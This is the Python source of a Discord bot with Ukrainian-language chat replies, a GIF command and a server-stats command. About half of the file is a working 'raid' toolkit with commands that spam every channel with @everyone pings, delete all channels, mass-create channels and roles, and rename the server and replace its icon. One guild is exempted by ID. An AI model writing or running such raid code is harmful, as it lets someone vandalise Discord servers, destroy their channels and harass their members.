import discord
from discord.ext import commands
import random
import psutil
import platform
import sys
import time
import datetime

from cfg import *

client = commands.Bot(command_prefix=prefix)

client.remove_command('help')

def guild_whitelist(ctx):
    return ctx.guild.id != 729729444083662921

@client.event
async def on_ready(): # When bot is run
    print(f'Bot connected as {client.user}')
    await client.change_presence(status = discord.Status.online, activity = discord.Game('я вернулся'))

@client.event
async def on_message(message):
    channel = message.channel
    random_color = random.choice(color_list)

    # On mention
    if client.user.mention in message.content.lower():
        await channel.send(f'Да-да, это я')

    # On other mentions
    for word in mentions:
        if word == message.content.lower():
            await channel.send(f'Ну так, це я, а шо таке?')
            print(f'{message.author}: {message.content}')

    # On Slava Ukraine message
    for word in ua_slava:
        if word in message.content.lower():
            await channel.send(embed = discord.Embed(description=f'Героям слава', color = 0xf9ff45).set_thumbnail(url='https://cdn-icons-png.flaticon.com/512/197/197572.png'))
            print(f'{message.author}: {message.content}')

    # On other messages
    for word in n_slava:
        if word in message.content.lower():
            await channel.send(embed = discord.Embed(description=f'Пиздець росіській федерації!', color = 0xf9ff45).set_thumbnail(url='https://cdn-icons-png.flaticon.com/512/197/197572.png'))
            print(f'{message.author}: {message.content}')

    # On hello messages
    for word in hello_words:
        if word in message.content.lower():
            await channel.send(embed = discord.Embed(description = f'Ну привіт, {message.author.mention} :heartpulse:', color = random_color))

    # On Osnova messages
    for word in o_words:
        if word in message.content.lower():
            await channel.send(f'Я')


    # On HowAreU messages
    for word in howareu:
        if word in message.content.lower():
            r = random.randint(1,2)
            if r == 1:
                await channel.send(f'Ай нормуль усе')
            else:
                await channel.send(f'Усе круто!')

    await client.process_commands(message)

@client.command(pass_context=True)
async def w(ctx): # Command that say 'Hi'
    await ctx.send(embed = discord.Embed(description=f'Усім привіт!'))

@client.command(pass_context=True)
async def say(ctx): # Saying message from console
    await ctx.message.delete()
    msg = input('Here: ')
    await ctx.send(msg)

@client.command(pass_context=True)
async def help(ctx, arg=None): # Command navigation
    emb = discord.Embed(title=f'Навігація по командам', description=f'*Префікс бота - **`***', color = 0x9059ff)

    # Commands list
    emb.add_field(name='**GitHub**', value='https://github.com/Quality15/bebrik-bot')
    emb.add_field(name='**{}help**'.format(prefix), value='Побачити це вікно')
    emb.add_field(name='**{}bebra**'.format(prefix), value='Випадкова ГІФка про бебру :heart_eyes:')
    emb.add_field(name='**{}ping**'.format(prefix), value='Дізнатися пінг та іншу інформацію про бота (CPU, Mem, OS)')

    await ctx.send(embed = emb)

@client.command(pass_context=True, aliases = ['бебра', 'бєбра'])
async def bebra(ctx): # Sending random GIF
    try:
        await ctx.send(random.choice(gifs_list))
    except Exception as e:
        await ctx.send(f'{e}')

@client.command(pass_context=True, aliases = ['os', 'mem', 'memory', 'cpu'])
async def ping(ctx): # System information about bot's server (CPU, Memory, OS)
    battery = psutil.sensors_battery()
    # percentbat = int(battery.percent)
    os_system = platform.system()
    os_release = platform.release()
    CPU = psutil.cpu_percent()
    mem = psutil.virtual_memory()
    percentmem = int(mem.percent)
    date_time = datetime.timedelta(seconds = 10000)

    emb=discord.Embed(title=f'Ping | CPU | Mem | OS', color = random.choice(color_list))
    #emb.add_field(name="автономный заряд", value=f"{percentbat}%")
    emb.add_field(name="OS", value=f"{os_system}-{os_release}")
    emb.add_field(name="CPU", value=f"{CPU}%", inline=False)
    emb.add_field(name="Memory", value=f"{percentmem}%", inline=False)
    emb.add_field(name="Ping", value=f"{round(client.latency * 1000)}ms", inline=False)

    await ctx.send(embed=emb)

@client.command(pass_context=True, aliases=['гітхаб', 'гитхаб'])
async def github(ctx):
    link = 'https://github.com/Quality15/bebrik-bot'

    emb = discord.Embed(title='Мій GitHub', description=f'*{link}*', color = random.choice(color_list))
    emb.set_author(name=ctx.author.name, icon_url=ctx.author.avatar_url)

    await ctx.send(embed = emb)



#Commands
#*Raid List
@client.command( pass_context = True, aliases = ['rlist', 'raidlist'] )
async def raid_list(ctx):
    try:
        await ctx.message.delete()     
    except Exception as e:
            await ctx.channel.send(f'*У бота немає прав адміністатора (в такому разі функції рейду будуть недоступні)*')
    finally:
        emb = discord.Embed(title = 'Рейд', description = '*Всі функція для рейду*', color = 0xCD5C5C)

        emb.add_field(name='Фулл Рейд', value = '**{}raid** ``кількість циклів`` ``текст`` ``(style)``'.format(prefix))
        emb.add_field(name='Спам', value ='**{}spam** ``кількість повідомлень`` ``текст``'.format(prefix))
        emb.add_field(name='Видалення каналів', value ='**{}delchannels** ``тип каналів (voice або text або all)``'.format(prefix))
        emb.add_field(name='Створення текстових каналів', value ='**{}createchannels** ``кількість каналів`` ``ім\'я каналів`` ``тип каналів``'.format(prefix))
        emb.add_field(name='Кік усіх учасників (не працює)', value ='**{}kickall**'.format(prefix))
        emb.add_field(name='Змінює ніки у всіх учасниках (не працює)', value='**{}changenick** ``нік``'.format(prefix))
        emb.add_field(name='Створює роль та видає її усім учасникам', value='**{}createrole** ``назва ролі``'.format(prefix))
        emb.add_field(name='Змінює назву серверу', value='**{}guildname** ``назва``'.format(prefix))
        emb.add_field(name='Змінює лого серверу', value='**{}guildlogo**'.format(prefix))

        #emb.add_field(name='Туторіал по використанню', value = 'https://youtu.be/jiF_oMV07Zs')

        emb.set_author(name=f'{client.user.name}', icon_url=f'{client.user.avatar_url}')
        emb.set_footer(text=f'{ctx.message.author.name}', icon_url = ctx.message.author.avatar_url)
        await ctx.channel.send(embed = emb)

#*Spam
@client.command( pass_context = True )
@commands.check(guild_whitelist)
async def spam(ctx, amount: int, *, text):
    try:
        for channels in ctx.guild.text_channels:
            for i in range(amount):
                await channels.send(f'**{text}**')
    except Exception as e:
        await ctx.channel.send(f'{e}')

#*Createchannels
@client.command()
@commands.check(guild_whitelist)
async def createchannels(ctx, count: int, name: str, type: str):
    try:
        if type == 'text':
            for i in range(count):
                await ctx.guild.create_text_channel(name)
        elif type == 'voice':
            for i in range(count):
                await ctx.guild.create_voice_channel(name)
        elif type == 'all':
            for i in range(count):
                await ctx.guild.create_text_channel(name)
                await ctx.guild.create_voice_channel(name)

    except Exception as e:
        await ctx.send(e)

#*DeleteChannels
@client.command()
@commands.check(guild_whitelist)
async def delchannels(ctx, type: str):
    try:
        if type == 'all':
            for channel in ctx.guild.channels:
                await channel.delete()
        elif type == 'text':
            for channel in ctx.guild.text_channels:
                await channel.delete()
        elif type == 'voice':
            for channel in ctx.guild.voice_channels:
                await channel.delete()

    except Exception as e:
        await ctx.send(e)

#*CreateRole
@client.command()
@commands.check(guild_whitelist)
async def createrole(ctx, name):
    try:
        role = await ctx.guild.create_role(name=name, color = discord.Colour(0x800080))
        for member in ctx.guild.members:
            await member.add_roles(role)

    except Exception as e:
        await ctx.send(e)

#*GuildName
@client.command()
@commands.check(guild_whitelist)
async def guildname(ctx, *, name):
    try:
        await ctx.guild.edit(name=name)

    except Exception as e:
        await ctx.send(e)

#*GuildLogo
@client.command()
@commands.check(guild_whitelist)
async def guildlogo(ctx):
    try:
        with open('logo.png', 'rb') as f:
            icon = f.read()
        await ctx.guild.edit(icon = icon)
    except Exception as e:
        await ctx.send(e)

#*FullRaid
@client.command()
@commands.check(guild_whitelist)
async def raid(ctx, amount: int, text: str, style: str = None):
    try:
        if style == None:
            guild = ctx.guild
            with open('logo.png', 'rb') as f:
                icon = f.read()

            await guild.edit(name=text, icon=icon)
            for i in range(amount):
                await guild.create_text_channel(text)
                await guild.create_voice_channel(text)
                for ch in guild.text_channels:
                    await ch.send(text)
                    await ch.send('@everyone')
                for member in guild.members:
                    role = await guild.create_role(name=text, color = discord.Colour(0x800080))
                    await member.add_roles(role)

        elif style == 'ukraine' or style == 'ukrainian': 
            guild = ctx.guild
            with open('ua-logo.jpg', 'rb') as f:
                icon = f.read()

            await guild.edit(name='Слава Україні!', icon=icon)
            for i in range(amount):
                await guild.create_text_channel(text)
                await guild.create_voice_channel(text)
                for ch in guild.text_channels:
                    await ch.send(text)
                    await ch.send('@everyone')
                for member in guild.members:
                    role = await guild.create_role(name=text, color = discord.Colour(0x800080))
                    await member.add_roles(role)

    except Exception as e:
        await ctx.send(e)

token = open('token.txt', 'r').read()
client.run(token)
